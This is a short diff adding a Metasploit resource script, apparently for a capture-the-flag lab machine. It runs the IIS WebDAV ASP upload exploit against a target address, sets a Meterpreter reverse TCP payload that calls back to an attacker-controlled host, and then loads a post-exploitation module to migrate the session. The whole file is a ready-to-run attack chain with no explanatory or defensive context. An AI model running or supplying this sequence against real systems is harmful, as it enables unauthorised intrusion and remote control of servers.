@@ -1,0 +1,8 @@
+use exploit/windows/iis/iis_webdav_upload_asp
+set rhost 10.10.10.15
+set lhost 10.10.14.105
+set payload windows/meterpreter_reverse_tcp
+run
+use post/windows/manage/migrate
+set session 1
+exploit
